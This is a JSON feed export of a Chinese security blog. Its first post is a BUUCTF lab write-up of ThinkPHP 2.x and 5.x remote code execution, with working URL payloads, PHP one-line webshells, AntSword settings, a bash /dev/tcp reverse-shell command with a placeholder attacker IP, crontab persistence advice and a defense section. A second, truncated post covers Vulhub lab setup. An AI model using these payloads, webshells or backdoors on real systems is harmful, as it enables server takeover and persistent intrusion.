{
    "version": "https://jsonfeed.org/version/1",
    "title": "bae的博客 • All posts by \"thinkphp\" tag",
    "description": "bae的个人博客",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/",
            "url": "https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/",
            "title": "ThinkPHP 2.x & 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）",
            "date_published": "2025-07-28T06:18:44.000Z",
            "content_html": "<h1 id=\"ThinkPHP-2-x-5-x-远程代码执行漏洞复现与利用（基于-BUUCTF）\"><a href=\"#ThinkPHP-2-x-5-x-远程代码执行漏洞复现与利用（基于-BUUCTF）\" class=\"headerlink\" title=\"ThinkPHP 2.x &amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）\"></a>ThinkPHP 2.x &amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）</h1><h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>ThinkPHP 是一个广受欢迎的 PHP 开发框架，但其早期版本（2.x 和 5.0.x 至 5.0.23）因设计缺陷存在严重的<strong>远程代码执行（RCE）漏洞</strong>。这些漏洞允许攻击者通过精心构造的 URL 参数执行任意 PHP 代码或系统命令，甚至实现服务器完全控制。本文基于 <strong>BUUCTF</strong> 在线靶场，详细复现 ThinkPHP 2.x 和 5.x 的 RCE 漏洞，涵盖漏洞原理、利用过程、蚁剑连接以及后门植入的可能性，旨在帮助安全从业者和开发者深入理解和防范此类漏洞。</p>\n<p>本文将分为两部分：</p>\n<ol>\n<li><strong>ThinkPHP 2.x RCE 漏洞</strong>：利用模板变量解析缺陷执行代码和命令。</li>\n<li><strong>ThinkPHP 5.x RCE 漏洞</strong>：通过框架路由调用任意函数实现代码执行。</li>\n</ol>\n<hr>\n<h2 id=\"二、ThinkPHP-2-x-RCE-漏洞复现\"><a href=\"#二、ThinkPHP-2-x-RCE-漏洞复现\" class=\"headerlink\" title=\"二、ThinkPHP 2.x RCE 漏洞复现\"></a>二、ThinkPHP 2.x RCE 漏洞复现</h2><h3 id=\"1-靶场环境\"><a href=\"#1-靶场环境\" class=\"headerlink\" title=\"1. 靶场环境\"></a>1. 靶场环境</h3><p>BUUCTF 提供在线靶场，无需自行搭建环境。</p>\n<ul>\n<li><strong>ThinkPHP 2.x RCE 漏洞地址</strong>：<code>https://buuoj.cn/challenges#[ThinkPHP]2-Rce</code><br>开启靶场，访问页面后，通常显示简陋的 ThinkPHP 2.x 欢迎页面，但后台隐藏着强大的远程命令执行能力 。</li>\n</ul>\n<h3 id=\"2-漏洞原理\"><a href=\"#2-漏洞原理\" class=\"headerlink\" title=\"2. 漏洞原理\"></a>2. 漏洞原理</h3><p>ThinkPHP 2.x 的模板引擎在处理 URL 参数时，直接将参数拼接为模板变量，未进行严格过滤。例如，URL 参数 <code>name=$&#123;@phpinfo()&#125;</code> 会被解析为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">echo</span> $&#123;@<span class=\"hljs-title function_ invoke__\">phpinfo</span>()&#125; <span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>由于 <code>@phpinfo()</code> 是合法的 PHP 函数调用，服务器会执行 <code>phpinfo()</code> 函数并返回结果。如果结合 <code>eval()</code> 或 <code>assert()</code>，攻击者可通过 GET 或 POST 参数进一步执行任意代码或系统命令，形成完全控制。</p>\n<h3 id=\"3-漏洞利用过程\"><a href=\"#3-漏洞利用过程\" class=\"headerlink\" title=\"3. 漏洞利用过程\"></a>3. 漏洞利用过程</h3><h4 id=\"步骤-1：测试代码执行（POC1）\"><a href=\"#步骤-1：测试代码执行（POC1）\" class=\"headerlink\" title=\"步骤 1：测试代码执行（POC1）\"></a>步骤 1：测试代码执行（POC1）</h4><p>使用以下 Payload 测试是否可以执行 PHP 代码：</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ruby\"><span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/node3.buuoj.cn:26104/</span><span class=\"hljs-string\">?s</span>=<span class=\"hljs-regexp\">/index/index</span><span class=\"hljs-regexp\">/name/</span><span class=\"hljs-variable\">$&#123;</span><span class=\"hljs-variable\">@phpinfo</span>()&#125;<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果</strong>：页面返回 <code>phpinfo()</code> 的详细信息，证明代码被成功解析执行 。</p>\n<h4 id=\"步骤-2：执行系统命令（POC2）\"><a href=\"#步骤-2：执行系统命令（POC2）\" class=\"headerlink\" title=\"步骤 2：执行系统命令（POC2）\"></a>步骤 2：执行系统命令（POC2）</h4><p>利用 <code>eval()</code> 结合 GET 参数执行系统命令（如 <code>ls</code>）：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node3.buuoj.cn:26104/?s=/index/index/name=$&#123;@eval($_GET</span>[<span class=\"hljs-string\">1</span>])&#125;&amp;1=system(%27ls%27);<br></code></pre></td></tr></table></figure>\n\n<p><strong>参数说明</strong>：</p>\n<ul>\n<li><code>name=$&#123;@eval($_GET[1])&#125;</code>：通过 <code>eval()</code> 执行 GET 参数 <code>1</code> 的内容。</li>\n<li><code>1=system(%27ls%27)</code>：执行 <code>system(&#39;ls&#39;)</code>，其中 <code>%27</code> 是 URL 编码的单引号 <code>&#39;</code>。</li>\n<li><strong>结果</strong>：页面返回目录列表，例如：<figure class=\"highlight axapta\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs axapta\"><span class=\"hljs-keyword\">index</span>.php<br>flag<br></code></pre></td></tr></table></figure>\n说明 <code>ls</code> 命令执行成功。</li>\n</ul>\n<h4 id=\"步骤-3：读取-Flag-文件\"><a href=\"#步骤-3：读取-Flag-文件\" class=\"headerlink\" title=\"步骤 3：读取 Flag 文件\"></a>步骤 3：读取 Flag 文件</h4><p>尝试读取 <code>/flag</code> 文件内容：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node3.buuoj.cn:26104/?s=/index/index/name=$&#123;@eval($_GET</span>[<span class=\"hljs-string\">1</span>])&#125;&amp;1=system(%27cat%20flag%27);<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果</strong>：页面返回类似以下内容：</p>\n<figure class=\"highlight dust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dust\"><span class=\"language-xml\">flag</span><span class=\"hljs-template-variable\">&#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#125;</span><br></code></pre></td></tr></table></figure>\n\n<p>这表明目标服务器已被完全控制 。</p>\n<h3 id=\"4-使用蚁剑连接\"><a href=\"#4-使用蚁剑连接\" class=\"headerlink\" title=\"4. 使用蚁剑连接\"></a>4. 使用蚁剑连接</h3><p>为了更方便地操作服务器，可以上传一句话木马并使用蚁剑（AntSword）进行交互。</p>\n<h4 id=\"构造-Payload：\"><a href=\"#构造-Payload：\" class=\"headerlink\" title=\"构造 Payload：\"></a>构造 Payload：</h4><p>使用 POST 参数构造一句话木马：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node3.buuoj.cn:26104/?s=/index/index/name=$&#123;@eval($_POST</span>[<span class=\"hljs-string\">1</span>])&#125;<br></code></pre></td></tr></table></figure>\n\n<p><strong>蚁剑配置</strong>：</p>\n<ul>\n<li><strong>URL</strong>：<code>http://node3.buuoj.cn:26104/?s=/index/index/name=$&#123;@eval($_POST[1])&#125;</code></li>\n<li><strong>密码</strong>：<code>1</code>（对应 <code>$_POST[1]</code>）</li>\n<li><strong>类型</strong>：PHP（原生）</li>\n<li><strong>编码</strong>：默认</li>\n</ul>\n<p>连接成功后，可使用蚁剑进行：</p>\n<ul>\n<li>命令行执行</li>\n<li>文件管理（如上传、下载）</li>\n<li>终端交互</li>\n</ul>\n<h3 id=\"5-进一步操作\"><a href=\"#5-进一步操作\" class=\"headerlink\" title=\"5. 进一步操作\"></a>5. 进一步操作</h3><p>在真实环境中，可进行以下高级操作：</p>\n<ol>\n<li><strong>上传 WebShell</strong>：<ul>\n<li>在蚁剑中上传一句话木马（如 <code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>）或冰蝎（Behinder）木马。</li>\n<li>保存到可访问路径（如 <code>/var/www/html/shell.php</code>）。</li>\n</ul>\n</li>\n<li><strong>反弹 Shell</strong>：<ul>\n<li>在 Kali 上启动监听：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">nc -lvnp 4444<br></code></pre></td></tr></table></figure></li>\n<li>在蚁剑中执行：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">bash -i &gt;&amp; /dev/tcp/你的IP/4444 0&gt;&amp;1<br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><strong>持久化后门</strong>：<ul>\n<li>添加计划任务（crontab）定时反弹 Shell。</li>\n<li>修改 <code>.bashrc</code> 文件，添加后门命令。</li>\n<li>写入定时任务（如每分钟执行反弹 Shell）。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"三、ThinkPHP-5-x-RCE-漏洞复现\"><a href=\"#三、ThinkPHP-5-x-RCE-漏洞复现\" class=\"headerlink\" title=\"三、ThinkPHP 5.x RCE 漏洞复现\"></a>三、ThinkPHP 5.x RCE 漏洞复现</h2><h3 id=\"1-靶场环境-1\"><a href=\"#1-靶场环境-1\" class=\"headerlink\" title=\"1. 靶场环境\"></a>1. 靶场环境</h3><p>BUUCTF 提供 ThinkPHP 5.x 在线靶场：</p>\n<ul>\n<li><strong>ThinkPHP 5.x RCE 漏洞地址</strong>：<code>https://buuoj.cn/challenges#[ThinkPHP]5-Rce</code><br>开启靶场，访问页面显示：</li>\n</ul>\n<figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs armasm\"><span class=\"hljs-symbol\">ThinkPHP</span> <span class=\"hljs-built_in\">V5</span><br>十年磨一剑 - 为 API 开发设计的高性能框架<br>[ <span class=\"hljs-built_in\">V5</span>.<span class=\"hljs-number\">0</span> 版本由 七牛云 独家赞助发布 ]<br></code></pre></td></tr></table></figure>\n\n<p>这表明靶场运行 ThinkPHP 5.x（版本 &lt;&#x3D; 5.0.23），漏洞复现环境已就绪 。</p>\n<h3 id=\"2-漏洞原理-1\"><a href=\"#2-漏洞原理-1\" class=\"headerlink\" title=\"2. 漏洞原理\"></a>2. 漏洞原理</h3><p>ThinkPHP 5.x 的 RCE 漏洞源于框架对 <code>\\think\\app::invokefunction</code> 方法的未授权访问。攻击者可通过 URL 参数调用 <code>call_user_func_array</code> 函数，动态执行任意 PHP 函数（如 <code>phpinfo</code>、<code>system</code>），并传递参数。</p>\n<p><strong>利用链</strong>：</p>\n<figure class=\"highlight sas\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sas\"><span class=\"hljs-keyword\">index</span>.php<br>└── ?s=<span class=\"hljs-keyword\">index</span>/\\think\\app/invokefunction<br>        <span class=\"hljs-variable\">&amp;function</span>=call_user_func_array<br>        <span class=\"hljs-variable\">&amp;vars</span>[0]=phpinfo<br>        <span class=\"hljs-variable\">&amp;vars</span>[1][]=-1<br></code></pre></td></tr></table></figure>\n\n<p><strong>参数说明</strong>：</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>含义说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>s</code></td>\n<td>ThinkPHP 路由，访问框架核心类</td>\n</tr>\n<tr>\n<td><code>function</code></td>\n<td>被调用的函数（如 <code>call_user_func_array</code>）</td>\n</tr>\n<tr>\n<td><code>vars[0]</code></td>\n<td>实际调用的函数名称（如 <code>phpinfo</code>、<code>system</code>）</td>\n</tr>\n<tr>\n<td><code>vars[1][]</code></td>\n<td>函数参数数组（如 <code>whoami</code>、<code>-1</code>）</td>\n</tr>\n</tbody></table>\n<h3 id=\"3-漏洞利用过程-1\"><a href=\"#3-漏洞利用过程-1\" class=\"headerlink\" title=\"3. 漏洞利用过程\"></a>3. 漏洞利用过程</h3><h4 id=\"步骤-1：信息探测（测试-phpinfo）\"><a href=\"#步骤-1：信息探测（测试-phpinfo）\" class=\"headerlink\" title=\"步骤 1：信息探测（测试 phpinfo）\"></a>步骤 1：信息探测（测试 <code>phpinfo</code>）</h4><p>构造 Payload 测试漏洞：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node5.buuoj.cn:27945/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class=\"hljs-string\">0</span>]=phpinfo&amp;vars[1][]=-1<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果</strong>：页面返回完整的 <code>phpinfo()</code> 信息，证明漏洞存在且可利用。</p>\n<h4 id=\"步骤-2：执行系统命令（whoami）\"><a href=\"#步骤-2：执行系统命令（whoami）\" class=\"headerlink\" title=\"步骤 2：执行系统命令（whoami）\"></a>步骤 2：执行系统命令（<code>whoami</code>）</h4><p>修改 Payload 执行 <code>whoami</code> 命令：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node5.buuoj.cn:27945/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class=\"hljs-string\">0</span>]=system&amp;vars[1][]=whoami<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果</strong>：页面返回：</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs haskell\"><span class=\"hljs-title\">www</span>-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span></span><br></code></pre></td></tr></table></figure>\n\n<p>表明 Web 服务以 <code>www-data</code> 用户运行，命令执行成功。</p>\n<h4 id=\"步骤-3：读取-Flag-文件-1\"><a href=\"#步骤-3：读取-Flag-文件-1\" class=\"headerlink\" title=\"步骤 3：读取 Flag 文件\"></a>步骤 3：读取 Flag 文件</h4><p>尝试读取 <code>/flag</code> 或根目录下的 <code>flag</code> 文件：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node5.buuoj.cn:27945/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class=\"hljs-string\">0</span>]=system&amp;vars[1][]=cat+/flag<br></code></pre></td></tr></table></figure>\n\n<p>或：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node5.buuoj.cn:27945/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class=\"hljs-string\">0</span>]=system&amp;vars[1][]=cat+/var/www/html/flag<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果</strong>：页面返回类似：</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">flag</span>&#123;d64e3f2e-xxxx-xxxx-xxxx-<span class=\"hljs-number\">0</span>ed8fe1b43f3&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-使用蚁剑连接-1\"><a href=\"#4-使用蚁剑连接-1\" class=\"headerlink\" title=\"4. 使用蚁剑连接\"></a>4. 使用蚁剑连接</h3><p>与 ThinkPHP 2.x 类似，可构造 POST 参数的一句话木马：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node5.buuoj.cn:27945/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class=\"hljs-string\">0</span>]=assert&amp;vars[1][]=eval($_POST[1])<br></code></pre></td></tr></table></figure>\n\n<p><strong>蚁剑配置</strong>：</p>\n<ul>\n<li><strong>URL</strong>：上述地址</li>\n<li><strong>密码</strong>：<code>1</code>（对应 <code>$_POST[1]</code>）</li>\n<li><strong>类型</strong>：PHP（原生）</li>\n<li><strong>编码</strong>：默认</li>\n</ul>\n<p>连接后可进行文件管理、命令执行等操作。</p>\n<hr>\n<h2 id=\"四、防御措施\"><a href=\"#四、防御措施\" class=\"headerlink\" title=\"四、防御措施\"></a>四、防御措施</h2><h3 id=\"1-升级-ThinkPHP-版本\"><a href=\"#1-升级-ThinkPHP-版本\" class=\"headerlink\" title=\"1. 升级 ThinkPHP 版本\"></a>1. 升级 ThinkPHP 版本</h3><ul>\n<li><strong>ThinkPHP 2.x</strong>：升级到更高版本（如 3.x 或 5.0.24+），修复模板解析漏洞。</li>\n<li><strong>ThinkPHP 5.x</strong>：升级到 5.0.24 或更高版本，官方已修复 RCE 漏洞。</li>\n</ul>\n<h3 id=\"2-输入验证与过滤\"><a href=\"#2-输入验证与过滤\" class=\"headerlink\" title=\"2. 输入验证与过滤\"></a>2. 输入验证与过滤</h3><ul>\n<li><strong>白名单验证</strong>：限制 <code>s</code> 参数和模板变量，只允许预定义值。</li>\n<li><strong>过滤危险函数</strong>：禁用 <code>eval</code>、<code>assert</code>、<code>call_user_func_array</code> 等高危函数。</li>\n<li><strong>参数校验</strong>：对用户输入进行严格过滤，防止注入。</li>\n</ul>\n<h3 id=\"3-禁用危险函数\"><a href=\"#3-禁用危险函数\" class=\"headerlink\" title=\"3. 禁用危险函数\"></a>3. 禁用危险函数</h3><p>在 <code>php.ini</code> 中禁用高危函数：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ini\"><span class=\"hljs-attr\">disable_functions</span> = eval,assert,exec,system,passthru,shell_exec,proc_open,call_user_func_array<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-最小权限原则\"><a href=\"#4-最小权限原则\" class=\"headerlink\" title=\"4. 最小权限原则\"></a>4. 最小权限原则</h3><ul>\n<li>配置 Web 服务器以最低权限运行（如非 root 用户）。</li>\n<li>限制 PHP 脚本的文件系统访问权限。</li>\n</ul>\n<h3 id=\"5-Web-应用防火墙（WAF）\"><a href=\"#5-Web-应用防火墙（WAF）\" class=\"headerlink\" title=\"5. Web 应用防火墙（WAF）\"></a>5. Web 应用防火墙（WAF）</h3><ul>\n<li>部署 WAF，拦截包含可疑路由（如 <code>\\think\\app</code>）或函数（如 <code>system</code>）的请求。</li>\n<li>使用正则规则匹配异常 Payload。</li>\n</ul>\n<h3 id=\"6-安全审计与监控\"><a href=\"#6-安全审计与监控\" class=\"headerlink\" title=\"6. 安全审计与监控\"></a>6. 安全审计与监控</h3><ul>\n<li>定期扫描 Web 应用，检查已知漏洞。</li>\n<li>监控服务器日志，及时发现异常请求。</li>\n</ul>\n<hr>\n<h2 id=\"五、总结\"><a href=\"#五、总结\" class=\"headerlink\" title=\"五、总结\"></a>五、总结</h2><table>\n<thead>\n<tr>\n<th>项目</th>\n<th>ThinkPHP 2.x RCE</th>\n<th>ThinkPHP 5.x RCE</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>漏洞名称</strong></td>\n<td>ThinkPHP 2.x RCE</td>\n<td>ThinkPHP 5.x RCE</td>\n</tr>\n<tr>\n<td><strong>影响版本</strong></td>\n<td>ThinkPHP 2.x</td>\n<td>ThinkPHP &lt;&#x3D; 5.0.23</td>\n</tr>\n<tr>\n<td><strong>漏洞原因</strong></td>\n<td>模板变量解析未过滤</td>\n<td>动态函数调用未授权</td>\n</tr>\n<tr>\n<td><strong>利用方法</strong></td>\n<td>GET&#x2F;POST 参数构造 <code>eval</code>&#x2F;<code>assert</code></td>\n<td>GET 请求构造路由 + 函数调用</td>\n</tr>\n<tr>\n<td><strong>关键函数</strong></td>\n<td><code>eval</code>, <code>assert</code></td>\n<td><code>call_user_func_array</code></td>\n</tr>\n<tr>\n<td><strong>检测方式</strong></td>\n<td>使用 <code>$&#123;@phpinfo()&#125;</code> 探测</td>\n<td>使用 <code>phpinfo</code> 探测，再尝试 <code>system</code></td>\n</tr>\n<tr>\n<td><strong>练习平台</strong></td>\n<td>BUUCTF（如 <code>node3.buuoj.cn:26104</code>）</td>\n<td>BUUCTF（如 <code>node5.buuoj.cn:27945</code>）</td>\n</tr>\n</tbody></table>\n<p>ThinkPHP 2.x 和 5.x 的 RCE 漏洞利用简单但危害极大，攻击者可通过简单的 URL 构造实现代码或命令执行，甚至完全控制服务器。BUUCTF 靶场为我们提供了便捷的复现环境，通过本文的演示，读者可以深入理解漏洞原理和利用流程。开发者应及时升级框架、加强输入验证、部署 WAF 和监控机制，以有效防范此类漏洞。</p>\n<blockquote>\n<p><strong>免责声明</strong>：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>\n</blockquote>\n",
            "tags": [
                "Web安全",
                "RCE",
                "漏洞复现",
                "ThinkPHP"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/",
            "url": "https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/",
            "title": "ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）",
            "date_published": "2025-07-27T09:25:25.000Z",
            "content_html": "<h1 id=\"深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）\"><a href=\"#深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）\" class=\"headerlink\" title=\"深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）\"></a>深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）</h1><h2 id=\"一、漏洞背景简介-🔍\"><a href=\"#一、漏洞背景简介-🔍\" class=\"headerlink\" title=\"一、漏洞背景简介 🔍\"></a>一、漏洞背景简介 🔍</h2><p>ThinkPHP 是一个轻量且易用的 PHP 开发框架，广泛应用于 Web 开发。然而，在 ThinkPHP 5.0.x 至 5.0.23 版本中，由于框架对动态函数调用（如 <code>invokeFunction</code>）的访问控制不严格，存在严重的 <strong>远程代码执行（RCE）漏洞</strong>。攻击者可通过精心构造的 URL 参数，调用任意 PHP 函数（如 <code>phpinfo</code> 或 <code>system</code>），实现远程执行任意代码或系统命令，危害极大。</p>\n<p>本文基于 Vulhub 靶场环境，详细讲解该漏洞的原理、环境搭建、利用过程及防御措施，旨在帮助安全从业者和开发者深入理解并防范此类漏洞。</p>\n<hr>\n<h2 id=\"二、漏洞环境搭建\"><a href=\"#二、漏洞环境搭建\" class=\"headerlink\" title=\"二、漏洞环境搭建\"></a>二、漏洞环境搭建</h2><p>为了复现 ThinkPHP 5.x RCE 漏洞，我们使用 Vulhub 提供的靶场环境，结合 Docker 和 Kali Linux 进行搭建。以下是详细步骤：</p>\n<h3 id=\"1-基础环境\"><a href=\"#1-基础环境\" class=\"headerlink\" title=\"1. 基础环境\"></a>1. 基础环境</h3><ul>\n<li><strong>操作系统</strong>：Kali Linux（推荐使用虚拟机）  </li>\n<li><strong>工具</strong>：已安装 Docker 和 Docker Compose  </li>\n<li><strong>网络模式</strong>：<ul>\n<li>NAT（用于访问外部网络）</li>\n<li>仅主机模式（Host-Only，Kali IP：<code>192.168.56.102</code>）</li>\n</ul>\n</li>\n<li><strong>硬件要求</strong>：建议 4GB 内存，2 核 CPU</li>\n</ul>\n<h3 id=\"2-获取-Vulhub-项目\"><a href=\"#2-获取-Vulhub-项目\" class=\"headerlink\" title=\"2. 获取 Vulhub 项目\"></a>2. 获取 Vulhub 项目</h3><p>Vulhub 是一个开源的漏洞靶场集合，包含 ThinkPHP 5.x RCE 环境。执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 切换到工作目录</span><br><span class=\"hljs-built_in\">cd</span> /root/vulhub/thinkphp/5-rce<br><br><span class=\"hljs-comment\"># 如果未下载 Vulhub，克隆项目</span><br>git <span class=\"hljs-built_in\">clone</span> https://github.com/vulhub/vulhub.git<br><span class=\"hljs-built_in\">cd</span> vulhub/thinkphp/5-rce<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-启动漏洞环境\"><a href=\"#3-启动漏洞环境\" class=\"headerlink\" title=\"3. 启动漏洞环境\"></a>3. 启动漏洞环境</h3><p>在 vulhub&#x2F;thinkphp&#x2F;5-rce 目录下，运行以下命令启动 Docker 容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose up -d<br></code></pre></td></tr></table></figure>\n\n<p>启动后，访问以下地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080<br></code></pre></td></tr></table></figure>\n\n<p>若看到 ThinkPHP V5 的欢迎页面，说明环境部署成功 </p>\n<h3 id=\"4-容器管理操作\"><a href=\"#4-容器管理操作\" class=\"headerlink\" title=\"4. 容器管理操作\"></a>4. 容器管理操作</h3><p>查看运行中的容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker ps<br></code></pre></td></tr></table></figure>\n\n<p>示例输出：</p>\n<figure class=\"highlight zsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs zsh\">CONTAINER ID   IMAGE                       PORTS                    NAMES<br>e5117e659934   vulhub/thinkphp:5.0.23      0.0.0.0:8080-&gt;80/tcp     thinkphp_5-rce_1<br></code></pre></td></tr></table></figure>\n\n<p>停止指定容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker stop e5117e659934<br></code></pre></td></tr></table></figure>\n\n<p>一键停止并移除容器及网络：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose down<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"三、漏洞原理解析\"><a href=\"#三、漏洞原理解析\" class=\"headerlink\" title=\"三、漏洞原理解析\"></a>三、漏洞原理解析</h2><h3 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h3><p>ThinkPHP 5.x 的控制器路由机制允许通过 URL 参数动态调用框架内部函数（如 <code>\\think\\app::invokeFunction</code>）。在 5.0.23 